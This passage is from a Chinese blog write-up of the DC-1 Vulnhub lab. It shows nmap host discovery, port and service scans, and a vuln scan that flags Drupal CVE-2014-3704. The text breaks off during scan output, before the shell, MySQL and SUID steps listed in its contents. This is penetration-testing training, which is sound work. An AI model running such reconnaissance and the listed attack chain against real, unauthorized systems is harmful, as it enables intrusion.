@@ -1,0 +1,895 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="初体验Metaspolit"><title>DC-1 Vulunhub靶场复现</title><link rel=canonical href=https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link rel=preload as=style href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap"><link rel=stylesheet href=/scss/style.min.389e156f5e9bb13df5a924cfa99dfb9c39f3e01e68d9e146cd65bdae963be145.css><meta property='og:title' content="DC-1 Vulunhub靶场复现"><meta property='og:description' content="初体验Metaspolit"><meta property='og:url' content='https://ke1thli.github.io/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/'><meta property='og:site_name' content='Ke1thLi 的技术笔记'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Vulnhub'><meta property='article:published_time' content='2026-07-18T00:00:00+00:00'><meta property='article:modified_time' content='2026-07-18T00:00:00+00:00'><meta name=twitter:title content="DC-1 Vulunhub靶场复现"><meta name=twitter:description content="初体验Metaspolit"><link rel="shortcut icon" href=/img/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar.png width=640 height=640 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🎓</span></figure><div class=site-meta><h1 class=site-name><a href=/>Ke1thLi 的技术笔记</a></h1><h2 class=site-description>The harder you work, the luckier you get</h2></div></header><ol class=menu-social><li><a href=https://github.com/Ke1thLi title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span></span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title"></h2><div class=widget--toc><nav class=toc-nav id=TableOfContents><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞扫描>漏洞扫描</a></li><li><a href=#获取shell并升级为交互shell并且获得flag1>获取shell并升级为交互shell并且获得flag1</a></li><li><a href=#找到了并读取寻找关键信息获得flag2>找到了并读取寻找关键信息获得flag2</a></li><li><a href=#登陆mysql>登陆MYSQL</a></li><li><a href=#重新登陆这个mysql替换原来的hash密码>重新登陆这个MYSQL替换原来的hash密码</a></li><li><a href=#访问http101010131user-之前nmap暴露出来的路径获取flag3>访问http://10.10.10.131/user 之前nmap暴露出来的路径获取flag3</a></li><li><a href=#根据提示我们需要找到密码并读取并找到了flag4>根据提示我们需要找到密码并读取并找到了flag4</a></li><li><a href=#很明显提示我们-suid-提权>很明显提示我们 suid 提权</a></li><li><a href=#获取flag5渗透结束>获取flag5渗透结束</a></li><li><a href=#总结>总结</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><div class=article-title-wrapper><h2 class=article-title><a href=/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/>DC-1 Vulunhub靶场复现</a></h2><h3 class=article-subtitle>初体验Metaspolit</h3></div><footer class=article-meta><div class=inline-meta><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2026-07-18T00:00:00Z>Saturday, July 18, 2026</time>
+<svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading></time></div></footer></div></header><aside class=article-toc><details><summary><div class=article-toc-title><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-chevron-right"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6-6 6"/></svg>
+<span></span></div></summary><nav class=toc-nav><ol><li><a href=#主机发现>主机发现</a></li><li><a href=#端口扫描>端口扫描</a></li><li><a href=#漏洞扫描>漏洞扫描</a></li><li><a href=#获取shell并升级为交互shell并且获得flag1>获取shell并升级为交互shell并且获得flag1</a></li><li><a href=#找到了并读取寻找关键信息获得flag2>找到了并读取寻找关键信息获得flag2</a></li><li><a href=#登陆mysql>登陆MYSQL</a></li><li><a href=#重新登陆这个mysql替换原来的hash密码>重新登陆这个MYSQL替换原来的hash密码</a></li><li><a href=#访问http101010131user-之前nmap暴露出来的路径获取flag3>访问http://10.10.10.131/user 之前nmap暴露出来的路径获取flag3</a></li><li><a href=#根据提示我们需要找到密码并读取并找到了flag4>根据提示我们需要找到密码并读取并找到了flag4</a></li><li><a href=#很明显提示我们-suid-提权>很明显提示我们 suid 提权</a></li><li><a href=#获取flag5渗透结束>获取flag5渗透结束</a></li><li><a href=#总结>总结</a></li></ol></nav></details></aside><section class=article-content><h1 id=dc-1-vulunhub靶场复现>DC-1 Vulunhub靶场复现</h1><h2 id=主机发现>主机发现</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DC-1<span class=o>]</span>
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sn 10.10.10.0/24                
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> kali 的密码：
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-18 15:35 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.1
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.0010s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:C0:00:08 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.2
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00014s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:F0:E1:42 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.131
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00018s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:99:02:5C <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.254
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00018s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>MAC Address: 00:50:56:E9:73:E2 <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.10
+</span></span><span class=line><span class=cl>Host is up.
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>256</span> IP addresses <span class=o>(</span><span class=m>5</span> hosts up<span class=o>)</span> scanned in 2.92 seconds
+</span></span></code></pre></td></tr></table></div></div><p>靶机ip为10.10.10.131</p><h2 id=端口扫描>端口扫描</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DC-1<span class=o>]</span>                            
+</span></span><span class=line><span class=cl>└─$ sudo nmap --min-rate <span class=m>1000</span> -p- 10.10.10.131
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-18 15:36 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.131                    
+</span></span><span class=line><span class=cl>Not shown: <span class=m>65531</span> closed tcp ports <span class=o>(</span>reset<span class=o>)</span> 
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE                                       
+</span></span><span class=line><span class=cl>22/tcp    open  ssh                                     
+</span></span><span class=line><span class=cl>80/tcp    open  http                                        
+</span></span><span class=line><span class=cl>111/tcp   open  rpcbind                                    
+</span></span><span class=line><span class=cl>56744/tcp open  unknown
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:99:02:5C <span class=o>(</span>VMware<span class=o>)</span>                                     
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 4.99 seconds
+</span></span><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DC-1<span class=o>]</span>                  
+</span></span><span class=line><span class=cl>└─$ sudo nmap -sT -sV -sC -O -p 80,22,111,56744 10.10.10.131
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-18 15:37 -0400
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.131
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00049s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>PORT      STATE SERVICE VERSION
+</span></span><span class=line><span class=cl>22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 <span class=o>(</span>protocol 2.0<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>1024</span> c4:d6:59:e6:77:4c:22:7a:96:16:60:67:8b:42:48:8f <span class=o>(</span>DSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 11:82:fe:53:4e:dc:5b:32:7f:44:64:82:75:7d:d0:a0 <span class=o>(</span>RSA<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 3d:aa:98:5c:87:af:ea:84:b8:23:68:8d:b9:05:5f:d8 <span class=o>(</span>ECDSA<span class=o>)</span>
+</span></span><span class=line><span class=cl>80/tcp    open  http    Apache httpd 2.2.22 <span class=o>((</span>Debian<span class=o>))</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> http-robots.txt: <span class=m>36</span> disallowed entries <span class=o>(</span><span class=m>15</span> shown<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+</span></span><span class=line><span class=cl><span class=p>|</span> /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+</span></span><span class=line><span class=cl><span class=p>|</span> /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+</span></span><span class=line><span class=cl><span class=p>|</span>_/LICENSE.txt /MAINTAINERS.txt
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Welcome to Drupal Site <span class=p>|</span> Drupal Site
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-generator: Drupal <span class=m>7</span> <span class=o>(</span>http://drupal.org<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Apache/2.2.22 <span class=o>(</span>Debian<span class=o>)</span>
+</span></span><span class=line><span class=cl>111/tcp   open  rpcbind 2-4 <span class=o>(</span>RPC <span class=c1>#100000)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> rpcinfo: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   program version    port/proto  service
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  2,3,4        111/tcp   rpcbind
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  2,3,4        111/udp   rpcbind
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  3,4          111/tcp6  rpcbind
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100000</span>  3,4          111/udp6  rpcbind
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100024</span>  <span class=m>1</span>          39494/udp6  status
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100024</span>  <span class=m>1</span>          40468/udp   status
+</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>100024</span>  <span class=m>1</span>          56744/tcp   status
+</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>100024</span>  <span class=m>1</span>          60199/tcp6  status
+</span></span><span class=line><span class=cl>56744/tcp open  status  <span class=m>1</span> <span class=o>(</span>RPC <span class=c1>#100024)</span>
+</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:99:02:5C <span class=o>(</span>VMware<span class=o>)</span>
+</span></span><span class=line><span class=cl>Warning: OSScan results may be unreliable because we could not find at least <span class=m>1</span> open and <span class=m>1</span> closed port
+</span></span><span class=line><span class=cl>Device type: general purpose
+</span></span><span class=line><span class=cl>Running: Linux 3.X
+</span></span><span class=line><span class=cl>OS CPE: cpe:/o:linux:linux_kernel:3
+</span></span><span class=line><span class=cl>OS details: Linux 3.2 - 3.16
+</span></span><span class=line><span class=cl>Network Distance: <span class=m>1</span> hop
+</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class=line><span class=cl>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 17.06 seconds
+</span></span></code></pre></td></tr></table></div></div><div class=table-wrapper><table><thead><tr><th>端口</th><th>服务</th><th>版本</th><th>利用价值</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 6.0p1 Debian 4+deb7u7</td><td></td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.2.22 ((Debian))</td><td></td></tr><tr><td>111/tcp</td><td>rpcbind</td><td>rpcbind 2-4</td><td></td></tr><tr><td>56744/tcp</td><td>unknown</td><td></td><td></td></tr></tbody></table></div><p>可以利用的似乎只有22 80 端口 ，并且版本较低</p><p>访问80端口，配合指纹插件</p><p><img class=gallery-image data-flex-basis=451px data-flex-grow=188 height=1020 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1.png srcset="/p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1_hu_6c63825371d4b6db.png 800w, /p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1_hu_60c22f34c5221512.png 1600w, /p/dc-1-vulunhub%E9%9D%B6%E5%9C%BA%E5%A4%8D%E7%8E%B0/index1.png 1920w" width=1920></p><h2 id=漏洞扫描>漏洞扫描</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span><span class=lnt>63
+</span><span class=lnt>64
+</span><span class=lnt>65
+</span><span class=lnt>66
+</span><span class=lnt>67
+</span><span class=lnt>68
+</span><span class=lnt>69
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~/Labs/Vulnhub/DC-1<span class=o>]</span>                        
+</span></span><span class=line><span class=cl>└─$ sudo nmap --script<span class=o>=</span>vuln -p22,80 10.10.10.131            
+</span></span><span class=line><span class=cl>Starting Nmap 7.99 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2026-07-18 15:51 -0400            
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.131                           
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00058s latency<span class=o>)</span>.                              
+</span></span><span class=line><span class=cl>PORT   STATE SERVICE
+</span></span><span class=line><span class=cl>22/tcp open  ssh
+</span></span><span class=line><span class=cl>80/tcp open  http    
+</span></span><span class=line><span class=cl><span class=p>|</span> http-vuln-cve2014-3704:    
+</span></span><span class=line><span class=cl><span class=p>|</span>   VULNERABLE:
+</span></span><span class=line><span class=cl><span class=p>|</span>   Drupal - pre Auth SQL Injection Vulnerability
+</span></span><span class=line><span class=cl><span class=p>|</span>     State: VULNERABLE <span class=o>(</span>Exploitable<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>     IDs:  CVE:CVE-2014-3704 
+</span></span><span class=line><span class=cl><span class=p>|</span>         The expandArguments <span class=k>function</span> in the database abstraction API in
+</span></span><span class=line><span class=cl><span class=p>|</span>         Drupal core 7.x before 7.32 does not properly construct prepared  
+</span></span><span class=line><span class=cl><span class=p>|</span>         statements, which allows remote attackers to conduct SQL injection      
+</span></span><span class=line><span class=cl><span class=p>|</span>         attacks via an array containing crafted keys.
+</span></span><span class=line><span class=cl><span class=p>|</span>                                                           
+</span></span><span class=line><span class=cl><span class=p>|</span>     Disclosure date: 2014-10-15                           
+</span></span><span class=line><span class=cl><span class=p>|</span>     References:                                           
+</span></span><span class=line><span class=cl><span class=p>|</span>       https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class=o>=</span>CVE-2014-3704        
+</span></span><span class=line><span class=cl><span class=p>|</span>       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html           
+</span></span><span class=line><span class=cl><span class=p>|</span>       https://www.drupal.org/SA-CORE-2014-005           
+</span></span><span class=line><span class=cl><span class=p>|</span>_      http://www.securityfocus.com/bid/70595         
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-sql-injection: ERROR: Script execution failed <span class=o>(</span>use -d to debug<span class=o>)</span>   
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-stored-xss: Couldn<span class=s1>&#39;t find any stored XSS vulnerabilities.       
+</span></span></span><span class=line><span class=cl><span class=s1>|_http-dombased-xss: Couldn&#39;</span>t find any DOM based XSS.
+</span></span><span class=line><span class=cl><span class=p>|</span> http-csrf: 
+</span></span><span class=line><span class=cl><span class=p>|</span> Spidering limited to: <span class=nv>maxdepth</span><span class=o>=</span>3<span class=p>;</span> <span class=nv>maxpagecount</span><span class=o>=</span>20<span class=p>;</span> <span class=nv>withinhost</span><span class=o>=</span>10.10.10.131
+</span></span><span class=line><span class=cl><span class=p>|</span>   Found the following possible CSRF vulnerabilities: 
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.131:80/
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: user-login-form
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form action: /node?destination<span class=o>=</span>node
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.131:80/node?destination<span class=o>=</span>node
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: user-login-form
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form action: /node?destination<span class=o>=</span>node
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.131:80/user/password
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: user-pass
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form action: /user/password
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.131:80/user/register
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: user-register-form
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form action: /user/register
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.131:80/user/
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: user-login
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form action: /user/
+</span></span><span class=line><span class=cl><span class=p>|</span>     
+</span></span><span class=line><span class=cl><span class=p>|</span>     Path: http://10.10.10.131:80/user
+</span></span><span class=line><span class=cl><span class=p>|</span>     Form id: user-login
+</span></span><span class=line><span class=cl><span class=p>|</span>_    Form action: /user
+</span></span><span class=line><span class=cl><span class=p>|</span> http-enum: 
+</span></span><span class=line><span class=cl><span class=p>|</span>   /rss.xml: RSS or Atom feed
+</span></span><span class=line><span class=cl><span class=p>|</span>   /robots.txt: Robots file
+</span></span><span class=line><span class=cl><span class=p>|</span>   /UPGRADE.txt: Drupal file
+</span></span><span class=line><span class=cl><span class=p>|</span>   /INSTALL.txt: Drupal file
+</span></span><span class=line><span class=cl><span class=p>|</span>   /INSTALL.mysql.txt: Drupal file
+</span></span><span class=line><span class=cl><span class=p>|</span>   /INSTALL.pgsql.txt: Drupal file
+</span></span><span class=line><span class=cl><span class=p>|</span>   /: Drupal version <span class=m>7</span> 
+</span></span><span class=line><span class=cl><span class=p>|</span>   /README: Interesting, a readme.
+</span></span><span class=line><span class=cl><span class=p>|</span>   /README.txt: Interesting, a readme.
+</span></span><span class=line><span class=cl><span class=p>|</span>   /0/: Potentially interesting folder
